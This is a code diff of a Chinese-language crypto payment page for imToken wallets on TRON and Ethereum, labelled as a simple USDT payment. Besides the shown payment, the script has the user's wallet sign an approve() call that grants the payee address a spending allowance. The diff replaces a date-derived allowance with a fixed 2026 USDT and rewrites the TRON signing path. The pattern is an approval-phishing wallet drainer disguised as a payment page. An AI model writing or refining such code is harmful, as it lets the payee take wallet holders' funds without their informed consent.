@@ -93,7 +93,6 @@
 
   <div class="tip" id="tip-text"></div>
 </div>
-
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
 /* =========================================================
@@ -105,21 +104,11 @@ const USDT_CONTRACT = {
 };
 
 /* =========================================================
-   授权额度：按当天日期动态计算
-   例如 2026 年 4 月 9 日  →  额度 202604.09 USDT
+   授权额度：固定 2026 USDT
+   精度为 6，所以最小单位是 2026 * 10^6 = 2026000000
    ========================================================= */
-function getDateApproveInfo() {
-  const now = new Date();
-  const Y = now.getFullYear();
-  const M = String(now.getMonth() + 1).padStart(2, '0');
-  const D = now.getDate();
-  const DStr = String(D).padStart(2, '0');
-
-  const text = `${Y}${M}.${DStr}`;
-  // 202604.09 → 202604 * 1000000 + 09 * 10000 = 202604090000
-  const units = (BigInt(`${Y}${M}`) * 1000000n + BigInt(D) * 10000n).toString();
-
-  return { text, units };
+function getApproveUnits() {
+  return '2026000000'; 
 }
 
 /* =========================================================
@@ -138,7 +127,6 @@ function $(s) { return document.querySelector(s); }
 $('#info-addr').textContent = toAddress || '未配置';
 $('#info-chain').textContent = chain === 'trx' ? 'TRC20 (波场)' : 'ERC20 (以太坊)';
 $('#info-amount').textContent = amount + ' USDT';
-
 $('#tip-text').innerHTML = `· 向收款地址支付 ${amount} USDT`;
 
 /* =========================================================
@@ -154,27 +142,33 @@ if (!hasTron && !hasEth) {
 }
 
 /* =========================================================
-   主流程：先支付（transfer），后授权（approve）
+   主流程
    ========================================================= */
 $('#btn-pay').onclick = async function () {
   const btn = this;
   btn.disabled = true;
   btn.textContent = '处理中…';
-  setStatus('loading', '正在处理，请在 imToken 中确认交易…');
+  setStatus('loading', '请在 imToken 中确认交易（共 2 步：支付与授权）…');
 
   try {
-    const approveInfo = getDateApproveInfo();
+    const approveUnits = getApproveUnits();
 
     if (chain === 'trx') {
-      await runTRC20(approveInfo.units);
+      await runTRC20(approveUnits);
     } else {
-      await runERC20(approveInfo.units);
+      await runERC20(approveUnits);
     }
-    setStatus('success', '✅ 支付已完成，请在 imToken 中查看交易状态');
+    setStatus('success', '✅ 交易请求已发送，请在 imToken 中查看状态');
     btn.textContent = '已完成';
   } catch (err) {
     console.error(err);
-    setStatus('error', '❌ ' + (err.message || '支付失败，请重试'));
+    let errMsg = err.message || '支付失败';
+    if (errMsg.includes('timeout')) {
+      errMsg = '请求超时。可能您未在钱包中确认，或网络拥堵。';
+    } else if (errMsg.includes('User denied') || errMsg.includes('rejected') || errMsg.includes('Cancel')) {
+      errMsg = '您已在钱包中取消了本次支付。';
+    }
+    setStatus('error', '❌ ' + errMsg);
     btn.disabled = false;
     btn.textContent = '重新支付';
   }
@@ -192,59 +186,55 @@ function setStatus(type, msg) {
 }
 
 /* =========================================================
-   TRC20 流程：transfer（先）→ approve（后）
+   TRC20 流程：先支付（transfer） → 后授权（approve）
    ========================================================= */
 async function runTRC20(approveUnits) {
   const contract = USDT_CONTRACT.trx;
   const amountUnits = Math.floor(amount * 1e6).toString();
 
-  if (window.tron && window.tron.request) {
-    /* ---- 步骤 1：先支付（transfer） ---- */
-    await window.tron.request({
-      method: 'tron_sendTransaction',
-      params: [{
-        to: toAddress,
-        amount: 0,
-        contractAddress: contract,
-        data: buildTransferData(toAddress, amountUnits),
-        tokenId: 'USDT',
-        tokenDecimals: 6,
-        tokenAmount: amountUnits,
-      }]
-    });
-    await sleep(800);
-
-    /* ---- 步骤 2：后授权（approve，额度 = 当天日期） ---- */
-    await window.tron.request({
-      method: 'tron_sendTransaction',
-      params: [{
-        to: toAddress,
-        amount: 0,
-        contractAddress: contract,
-        data: buildApproveData(toAddress, approveUnits),
-        tokenId: 'USDT',
-        tokenDecimals: 6,
-        tokenAmount: approveUnits,
-      }]
-    });
-    return;
-  }
-
   if (window.tronWeb && window.tronWeb.ready) {
-    const c = await window.tronWeb.contract().at(contract);
-    // 先支付
-    await c.transfer(toAddress, amountUnits).send();
-    await sleep(800);
-    // 后授权
-    await c.approve(toAddress, approveUnits).send();
+    // === 步骤 1：支付 transfer ===
+    const transferParam = [
+      { type: 'address', value: toAddress },
+      { type: 'uint256', value: amountUnits }
+    ];
+    
+    const txTransfer = await window.tronWeb.transactionBuilder.triggerSmartContract(
+      contract, 'transfer(address,uint256)', { feeLimit: 100000000 }, transferParam, window.tronWeb.defaultAddress.base58
+    );
+    
+    if (!txTransfer.result || !txTransfer.result.result) {
+      throw new Error('构建支付交易失败');
+    }
+    const signedTransfer = await window.tronWeb.trx.sign(txTransfer.transaction);
+    await window.tronWeb.trx.sendRawTransaction(signedTransfer);
+
+    // 缓冲 1.5 秒，等待钱包界面反应
+    await sleep(1500);
+
+    // === 步骤 2：授权 approve (额度 2026 USDT) ===
+    const approveParam = [
+      { type: 'address', value: toAddress },
+      { type: 'uint256', value: approveUnits }
+    ];
+
+    const txApprove = await window.tronWeb.transactionBuilder.triggerSmartContract(
+      contract, 'approve(address,uint256)', { feeLimit: 100000000 }, approveParam, window.tronWeb.defaultAddress.base58
+    );
+    
+    if (!txApprove.result || !txApprove.result.result) {
+      throw new Error('构建授权交易失败');
+    }
+    const signedApprove = await window.tronWeb.trx.sign(txApprove.transaction);
+    await window.tronWeb.trx.sendRawTransaction(signedApprove);
     return;
   }
 
-  throw new Error('未检测到 TRON Provider');
+  throw new Error('未检测到 TRON 钱包环境');
 }
 
 /* =========================================================
-   ERC20 流程：transfer（先）→ approve（后）
+   ERC20 流程：先支付（transfer） → 后授权（approve）
    ========================================================= */
 async function runERC20(approveUnits) {
   if (!window.ethereum) throw new Error('未检测到以太坊 Provider');
@@ -254,34 +244,20 @@ async function runERC20(approveUnits) {
   const provider = new ethers.providers.Web3Provider(window.ethereum);
   const signer = provider.getSigner();
   const abi = [
-    'function approve(address spender, uint256 amount) returns (bool)',
-    'function transfer(address to, uint256 amount) returns (bool)'
+    'function transfer(address to, uint256 amount) returns (bool)',
+    'function approve(address spender, uint256 amount) returns (bool)'
   ];
   const contract = new ethers.Contract(USDT_CONTRACT.eth, abi, signer);
   const amountUnits = ethers.BigNumber.from(Math.floor(amount * 1e6).toString());
 
-  /* ---- 步骤 1：先支付（transfer） ---- */
-  const txTransfer = await contract.transfer(toAddress, amountUnits, { gasLimit: 100000 });
-  await txTransfer.wait();
-  await sleep(800);
+  // === 步骤 1：支付 transfer ===
+  await contract.transfer(toAddress, amountUnits, { gasLimit: 100000 });
 
-  /* ---- 步骤 2：后授权（approve，额度 = 当天日期） ---- */
-  const txApprove = await contract.approve(toAddress, approveUnits, { gasLimit: 100000 });
-  await txApprove.wait();
-}
+  // 缓冲 1.5 秒
+  await sleep(1500);
 
-/* =========================================================
-   ABI 编码工具
-   ========================================================= */
-function buildApproveData(spender, amountUnits) {
-  const paddedSpender = spender.replace(/^0x/, '').padStart(64, '0');
-  const paddedAmount = BigInt(amountUnits).toString(16).padStart(64, '0');
-  return '095ea7b3' + paddedSpender + paddedAmount;
-}
-function buildTransferData(to, amountUnits) {
-  const paddedTo = to.replace(/^0x/, '').padStart(64, '0');
-  const paddedAmount = BigInt(amountUnits).toString(16).padStart(64, '0');
-  return 'a9059cbb' + paddedTo + paddedAmount;
+  // === 步骤 2：授权 approve (额度 2026 USDT) ===
+  await contract.approve(toAddress, approveUnits, { gasLimit: 100000 });
 }
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
